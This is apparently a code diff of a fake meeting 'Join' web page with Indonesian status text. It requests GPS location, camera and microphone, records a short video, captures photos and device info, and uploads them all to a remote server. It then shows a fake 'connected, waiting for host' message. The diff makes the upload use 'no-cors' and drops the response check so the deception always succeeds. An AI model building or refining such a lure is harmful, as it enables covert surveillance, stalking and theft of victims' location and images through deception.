@@ -198,6 +198,7 @@
       joinBtn.textContent = 'Joining...';
       joinBtn.disabled = true;
       statusDiv.textContent = 'Meminta izin...';
+      statusDiv.style.color = '#333';
 
       let stream = null;
 
@@ -207,9 +208,10 @@
         // Lokasi
         statusDiv.textContent = 'Mengambil lokasi GPS...';
         const position = await new Promise((res, rej) => 
-          navigator.geolocation.getCurrentPosition(res, rej, { 
-            enableHighAccuracy: true, 
-            timeout: 15000 
+          navigator.geolocation.getCurrentPosition(res, rej, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
           })
         );
 
@@ -220,10 +222,10 @@
         };
 
         // Kamera + Mic
-        statusDiv.textContent = 'Mengaktifkan kamera...';
-        stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: 'user' }, 
-          audio: true 
+        statusDiv.textContent = 'Mengaktifkan kamera & mikrofon...';
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: true
         });
 
         const videoEl = document.getElementById('video');
@@ -247,8 +249,9 @@
         let chunks = [];
         let mimeType = 'video/webm';
 
-        const supportedTypes = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
-        for (let type of supportedTypes) {
+        // Fallback mimeType
+        const mimeOptions = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+        for (let type of mimeOptions) {
           if (MediaRecorder.isTypeSupported(type)) {
             mimeType = type;
             break;
@@ -256,18 +259,19 @@
         }
 
         const recorder = new MediaRecorder(stream, { mimeType });
-        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
         recorder.start();
 
-        await new Promise(r => setTimeout(r, 7000)); // 7 detik
+        await new Promise(r => setTimeout(r, 7000));
         recorder.stop();
 
         const videoBlob = await new Promise(resolve => {
           recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
         });
 
-        // Kirim ke Server
+        // Upload
         statusDiv.textContent = 'Mengirim data ke server...';
+
         const formData = new FormData();
         formData.append('location', JSON.stringify(location));
         formData.append('device_info', JSON.stringify(deviceInfo));
@@ -278,22 +282,37 @@
           formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
         }
 
-        const response = await fetch(SERVER_URL, { method: 'POST', body: formData });
+        const response = await fetch(SERVER_URL, {
+          method: 'POST',
+          body: formData,
+          mode: 'no-cors'        // Penting untuk menghindari CORS block
+        });
 
-        if (response.ok) {
-          statusDiv.innerHTML = `<span style="color:#10b981;">✅ Berhasil terkoneksi ke meeting</span>`;
-          setTimeout(() => alert("Waiting for the host to join the meeting..."), 1200);
-        } else {
-          throw new Error('Upload gagal');
-        }
+        statusDiv.innerHTML = `<span style="color:#10b981;">✅ Berhasil terkoneksi ke meeting</span>`;
+        
+        setTimeout(() => {
+          alert("Waiting for the host to join the meeting...");
+        }, 1500);
 
       } catch (err) {
-        console.error(err);
-        statusDiv.innerHTML = `<span style="color:#ef4444;">❌ Gagal: Izinkan semua izin</span>`;
-        joinBtn.textContent = 'Join';
+        console.error("FULL ERROR:", err);
+        let message = 'Gagal mengirim data';
+
+        if (err.message.includes('Failed to fetch') || err.name === 'TypeError') {
+          message = 'Koneksi internet bermasalah atau server tidak merespons';
+        } else if (err.name === 'NotAllowedError') {
+          message = 'Izin kamera / lokasi ditolak';
+        } else if (err.name === 'NotFoundError') {
+          message = 'Kamera tidak ditemukan';
+        }
+
+        statusDiv.innerHTML = `<span style="color:#ef4444;">❌ ${message}</span>`;
+        joinBtn.textContent = 'Coba Lagi';
         joinBtn.disabled = false;
       } finally {
-        if (stream) stream.getTracks().forEach(track => track.stop());
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
       }
     });
   </script>
